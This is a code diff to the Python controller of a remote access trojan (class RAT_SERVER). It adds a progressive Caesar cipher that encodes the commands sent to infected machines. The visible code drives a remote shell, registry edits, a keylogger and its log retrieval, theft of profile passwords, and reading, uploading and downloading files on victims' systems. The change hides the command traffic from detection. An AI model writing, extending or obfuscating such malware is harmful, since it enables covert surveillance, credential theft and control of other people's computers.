@@ -1,5 +1,32 @@
-import random
-import socket, os
+import socket
+
+def progressive_caesar_encrypt(text):
+    """
+    Cifra el texto usando un método de cifrado César progresivo.
+    
+    En lugar de usar un desplazamiento fijo como en el cifrado César clásico, esta función aplica un desplazamiento que 
+    incrementa con cada letra del texto. La primera letra se desplaza 1 posición en el alfabeto, la segunda se desplaza 
+    2 posiciones, la tercera 3 posiciones, y así sucesivamente. El desplazamiento se reinicia en el alfabeto cuando llega 
+    al final (cifrado modular). Solo se cifran los caracteres alfabéticos.
+
+    Args:
+        text (str): El texto a cifrar.
+        
+    Returns:
+        str: El texto cifrado con desplazamientos progresivos.
+    """
+    result = ''
+    shift = 1 
+
+    for char in text:
+        if char.isalpha():
+            shift_base = 65 if char.isupper() else 97
+            result += chr((ord(char) - shift_base + shift) % 26 + shift_base)
+            shift += 1 
+        else:
+            result += char
+
+    return result
 
 class RAT_SERVER:
     def __init__(self, host, port):
@@ -31,13 +58,13 @@ class RAT_SERVER:
         server.stop_server()
     
     def result(self):
-        client.send(command.encode())
+        client.send(command_encrypted.encode())
         result_output = client.recv(1024).decode()
         print(result_output)
     
     def banner(self):
         print("======================================================")
-        print("                       Commands                       ")
+        print("                       Commands :)                    ")
         print("======================================================")
         print("System: ")
         print("======================================================")
@@ -117,11 +144,13 @@ readfile <file>           read from file
     def execute(self):
         self.banner()
         while True:
-            global command
+            global command, command_encrypted
             command = input('Command >>  ')
 
+            command_encrypted = progressive_caesar_encrypt(command)
+
             if command == 'shell':
-                client.send(command.encode())
+                client.send(command_encrypted.encode())
                 while 1:
                     command = str(input('>> '))
                     client.send(command.encode())
@@ -136,7 +165,7 @@ readfile <file>           read from file
                 self.result()
             
             elif command == 'setvalue':
-                client.send(command.encode())
+                client.send(command_encrypted.encode())
                 const = str(input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
                 root = str(input('Enter the path to store key [ex. SOFTWARE\\test]: '))
                 key = str(input('Enter the key name: '))
@@ -149,7 +178,7 @@ readfile <file>           read from file
                 print(result_output)
             
             elif command == 'delkey':
-                client.send(command.encode())
+                client.send(command_encrypted.encode())
                 const = str(input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
                 root = str(input('Enter the path to key: '))
                 client.send(const.encode())
@@ -158,7 +187,7 @@ readfile <file>           read from file
                 print(result_output)
             
             elif command == 'createkey':
-                client.send(command.encode())
+                client.send(command_encrypted.encode())
                 const = str(input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
                 root = str(input('Enter the path to key: '))
                 client.send(const.encode())
@@ -188,17 +217,17 @@ readfile <file>           read from file
                 self.result()
             
             elif command == 'keyscan_start':
-                client.send(command.encode())
+                client.send(command_encrypted.encode())
                 result_output = client.recv(1024).decode()
                 print(result_output)
             
             elif command == 'send_logs':
-                client.send(command.encode())
+                client.send(command_encrypted.encode())
                 result_output = client.recv(1024).decode()
                 print(result_output)
             
             elif command == 'stop_keylogger':
-                client.send(command.encode())
+                client.send(command_encrypted.encode())
                 result_output = client.recv(1024).decode()
                 print(result_output)
             
@@ -227,7 +256,7 @@ readfile <file>           read from file
                     self.result()
             
             elif command == 'sendmessage':
-                client.send(command.encode())
+                client.send(command_encrypted.encode())
                 text = str(input("Enter the text: "))
                 client.send(text.encode())
                 title = str(input("Enter the title: "))
@@ -236,7 +265,7 @@ readfile <file>           read from file
                 print(result_output)
             
             elif command == 'profilepswd':
-                client.send(command.encode())
+                client.send(command_encrypted.encode())
                 profile = str(input("Enter the profile name: "))
                 client.send(profile.encode())
                 result_output = client.recv(2147483647).decode()
@@ -282,7 +311,7 @@ readfile <file>           read from file
                 if not command[9:]:
                     print("No file to read")
                 else:
-                    client.send(command.encode())
+                    client.send(command_encrypted.encode())
                     result_output = client.recv(2147483647).decode()
                     print("===================================================")
                     print(result_output)
@@ -329,7 +358,7 @@ readfile <file>           read from file
 
             elif command[:8] == 'download':
                 try:
-                    client.send(command.encode())
+                    client.send(command_encrypted.encode())
                     file = client.recv(2147483647)
                     with open(f'{command.split(" ")[2]}', 'wb') as f:
                         f.write(file)
@@ -339,7 +368,7 @@ readfile <file>           read from file
                     print("Not enough arguments")
 
             elif command == 'upload':
-                client.send(command.encode())
+                client.send(command_encrypted.encode())
                 file = str(input("Enter the filepath to the file: "))
                 filename = str(input("Enter the filepath to outcoming file (with filename and extension): "))
                 data = open(file, 'rb')
@@ -361,7 +390,7 @@ readfile <file>           read from file
                 self.banner()
 
             elif command == 'exit':
-                client.send(command.encode())
+                client.send(command_encrypted.encode())
                 output = client.recv(1024)
                 output = output.decode()
                 print(output)
